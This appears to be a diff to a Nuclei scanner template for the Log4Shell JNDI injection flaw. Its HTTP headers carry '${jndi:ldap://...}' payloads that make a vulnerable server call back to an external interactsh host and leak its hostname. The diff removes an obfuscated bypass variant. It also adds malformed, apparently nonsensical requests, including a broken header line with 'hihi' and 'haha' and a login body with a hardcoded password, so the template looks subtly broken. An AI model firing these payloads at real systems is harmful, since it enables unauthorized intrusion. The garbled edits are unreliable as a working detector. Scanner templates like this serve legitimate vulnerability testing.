@@ -24,7 +24,7 @@ requests:
         GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
         Host: {{Hostname}}
       - |
-        GET / HTTP/1.1
+        POST / HTTP/1.1
         Host: {{Hostname}}
         Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
         Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
@@ -44,14 +44,20 @@ requests:
         X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
         X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
         X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
-      # - |      
-      #   GET / HTTP/1.1
-      #   Host: {{Hostname}}
-      #   User-Agent: Chrome ${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.${hostName}.useragent.{{interactsh-url}}}
-      #   Accept-Encoding: gzip, deflate
-      #   Accept: */*
-      #   Connection: close
+        Content-Type: application/json
 
+        {"result": [{"id": 2, "name": "US", "flag": "sf{{Hostname}}"}]}
+      - |
+         POST / HTTP/1.1
+         Host: {{Hostname}}
+         User-Agent: Chrome {{Hostname}}
+         {{Scheme}}: {{Host}}:{{Port}} hihi {{Path}} haha {{Hostname}}
+         Accept-Encoding: gzip, deflate
+         Accept: */*
+         Connection: close
+         Content-Type: application/x-www-form-urlencoded
+        
+         username=tranhung{{Port}}&passwd=123456
     stop-at-first-match: true
     matchers-condition: and
     matchers:
